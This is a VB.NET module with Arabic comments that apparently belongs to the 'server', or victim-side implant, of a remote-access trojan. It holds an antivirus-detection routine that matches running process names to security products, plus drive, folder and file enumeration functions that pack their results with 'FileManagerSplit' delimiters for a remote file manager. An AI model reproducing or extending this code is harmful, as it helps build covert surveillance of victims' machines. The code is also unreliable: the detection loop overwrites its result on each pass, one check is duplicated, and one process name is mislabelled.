'  استداء اكثر من فضاء سوف نحتاج اليها للاتمام السيرفر
Imports System.Diagnostics
Imports System.Net, System.Net.Sockets, System.IO, System.Threading, System.Runtime.Serialization.Formatters.Binary, System.Runtime.Serialization, System.Runtime.InteropServices, Microsoft.Win32


Module Module1
    Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)

    ' فنكشين للتحويل من سترينغ الي بايت
    Function SB(ByVal s As String) As Byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    ' فنكشين للتحويل من بايت الي سترينغ
    Function BS(ByVal b As Byte()) As String
        Return System.Text.Encoding.Default.GetString(b)
    End Function

    Public GetProcesses() As Process  ' اريه من نوع سترينغ
    Function getanti() ' فنكشيم جلب اسم الانتي فايروس

        Dim antivirus As String
        'get name anti-virus vb.net function
        Dim procList() As Process = Process.GetProcesses()

        Dim i As Integer
        For i = 0 To procList.Length - 1 Step i + 1
            Dim strProcName As String = procList(i).ProcessName
            If strProcName = "ekrn" Then
                antivirus = "NOD32"
            ElseIf strProcName = "avgcc" Then
                antivirus = "AVG"
            ElseIf strProcName = "avgnt" Then
                antivirus = "Avira"
            ElseIf strProcName = "ahnsd" Then
                antivirus = "AhnLab-V3"
            ElseIf strProcName = "bdss" Then
                antivirus = "BitDefender"
            ElseIf strProcName = "bdv" Then
                antivirus = "ByteHero"
            ElseIf strProcName = "clamav" Then
                antivirus = "ClamAV"
            ElseIf strProcName = "fpavserver" Then
                antivirus = "F-Prot"
            ElseIf strProcName = "fssm32" Then
                antivirus = "F-Secure"
            ElseIf strProcName = "avkcl" Then
                antivirus = "GData"
            ElseIf strProcName = "engface" Then
                antivirus = "Jiangmin"
            ElseIf strProcName = "avp" Then
                antivirus = "Kaspersky"
            ElseIf strProcName = "updaterui" Then
                antivirus = "McAfee"
            ElseIf strProcName = "msmpeng" Then
                antivirus = "microsoft security essentials"
            ElseIf strProcName = "zanda" Then
                antivirus = "Norman"
            ElseIf strProcName = "npupdate" Then
                antivirus = "nProtect"
            ElseIf strProcName = "inicio" Then
                antivirus = "Panda"
            ElseIf strProcName = "sagui" Then
                antivirus = "Prevx"
            ElseIf strProcName = "Norman" Then
                antivirus = "Sophos"
            ElseIf strProcName = "savservice" Then
                antivirus = "Sophos"
            ElseIf strProcName = "saswinlo" Then
                antivirus = "SUPERAntiSpyware"
            ElseIf strProcName = "spbbcsvc" Then
                antivirus = "Symantec"
            ElseIf strProcName = "thd32" Then
                antivirus = "TheHacker"
            ElseIf strProcName = "ufseagnt" Then
                antivirus = "TrendMicro"
            ElseIf strProcName = "dllhook" Then
                antivirus = "VBA32"
            ElseIf strProcName = "sbamtray" Then
                antivirus = "VIPRE"
            ElseIf strProcName = "vrmonsvc" Then
                antivirus = "ViRobot"
            ElseIf strProcName = "dllhook" Then
                antivirus = "VBA32"
            ElseIf strProcName = "vbcalrt" Then
                antivirus = "VirusBuster"
            Else
                antivirus = "Not Found"
            End If

            Dim iProcID As Integer = procList(i).Id
        Next
        Return antivirus
    End Function





    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array ' split bytes by word
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function
    Public Function getDrives() As String
        Dim allDrives As String = ""
        For Each d As DriveInfo In My.Computer.FileSystem.Drives
            Select Case d.DriveType
                Case 3
                    allDrives += "[Drive]" & d.Name & "FileManagerSplitFileManagerSplit"
                Case 5
                    allDrives += "[CD]" & d.Name & "FileManagerSplitFileManagerSplit"
            End Select
        Next
        Return allDrives
    End Function

    Public Function getFolders(ByVal location) As String
        Dim di As New DirectoryInfo(location)
        Dim folders = ""
        For Each subdi As DirectoryInfo In di.GetDirectories
            folders += "[Folder]" & subdi.Name & "FileManagerSplitFileManagerSplit"
        Next
        Return folders
    End Function
    Public Function getFiles(ByVal location) As String
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.*")
            files += f.Name & "FileManagerSplit" & f.Length.ToString & "FileManagerSplit"
        Next
        Return files
    End Function

End Module
